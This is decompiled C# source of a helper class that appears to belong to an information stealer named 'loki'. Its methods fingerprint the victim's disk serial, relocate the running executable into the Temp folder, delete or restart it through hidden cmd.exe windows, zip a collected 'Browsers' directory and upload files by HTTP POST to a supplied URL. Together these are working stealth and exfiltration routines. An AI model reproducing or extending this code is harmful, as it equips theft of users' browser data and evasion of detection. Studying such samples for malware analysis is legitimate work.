using System;
using System.Diagnostics;
using System.IO;
using System.IO.Compression;
using System.Management;
using System.Net;
using System.Reflection;
using loki;

namespace NoFile
{
	// Token: 0x02000015 RID: 21
	internal class Helper
	{
		// Token: 0x060000EF RID: 239 RVA: 0x00006498 File Offset: 0x00004698
		public static string GetHwid()
		{
			string result = "";
			try
			{
				string str = Environment.GetFolderPath(Environment.SpecialFolder.System).Substring(0, 1);
				ManagementObject managementObject = new ManagementObject("win32_logicaldisk.deviceid=\"" + str + ":\"");
				managementObject.Get();
				result = managementObject["VolumeSerialNumber"].ToString();
			}
			catch (Exception)
			{
			}
			return result;
		}

		// Token: 0x060000F0 RID: 240 RVA: 0x000064FC File Offset: 0x000046FC
		public static string GetRandomString()
		{
			return Path.GetRandomFileName().Replace(".", "");
		}

		// Token: 0x060000F1 RID: 241 RVA: 0x00006514 File Offset: 0x00004714
		public static string Move()
		{
			try
			{
				string text = Environment.GetEnvironmentVariable("Temp") + "\\" + Helper.GetHwid();
				Directory.CreateDirectory(text);
				File.Move(Directory.GetCurrentDirectory() + "\\" + new FileInfo(new Uri(Assembly.GetExecutingAssembly().CodeBase).LocalPath).Name, text + "\\temp.exe");
				return text;
			}
			catch (Exception)
			{
			}
			return null;
		}

		// Token: 0x060000F2 RID: 242 RVA: 0x0000659C File Offset: 0x0000479C
		public static void SelfDelete(string dir, string name)
		{
			Process.Start(new ProcessStartInfo
			{
				Arguments = "/C choice /C Y /N /D Y /T 1 & Del \"" + name + "\"",
				WindowStyle = ProcessWindowStyle.Hidden,
				CreateNoWindow = true,
				FileName = "cmd.exe"
			});
		}

		// Token: 0x060000F3 RID: 243 RVA: 0x000065D8 File Offset: 0x000047D8
		public static void SelfRestart(string name)
		{
			Process.Start(new ProcessStartInfo
			{
				Arguments = "/C choice /C Y /N /D Y /T 1 & \"" + name + " --zip\"",
				WindowStyle = ProcessWindowStyle.Hidden,
				CreateNoWindow = true,
				FileName = "cmd.exe"
			});
		}

		// Token: 0x060000F4 RID: 244 RVA: 0x00006614 File Offset: 0x00004814
		public static void SendFile(string url, string filepath)
		{
			try
			{
				new WebClient().UploadFile(url, "POST", filepath);
			}
			catch (Exception)
			{
			}
		}

		// Token: 0x060000F5 RID: 245 RVA: 0x00006648 File Offset: 0x00004848
		public static void Zip(string dir, string zipPath)
		{
			try
			{
				ZipFile.CreateFromDirectory(dir, zipPath, CompressionLevel.Optimal, false);
			}
			catch (Exception)
			{
			}
		}

		// Token: 0x04000043 RID: 67
		public static readonly string LocalData = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);

		// Token: 0x04000044 RID: 68
		public static readonly string AppDate = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);

		// Token: 0x04000045 RID: 69
		public static string Browsers = Program.dir + "\\Browsers";
	}
}
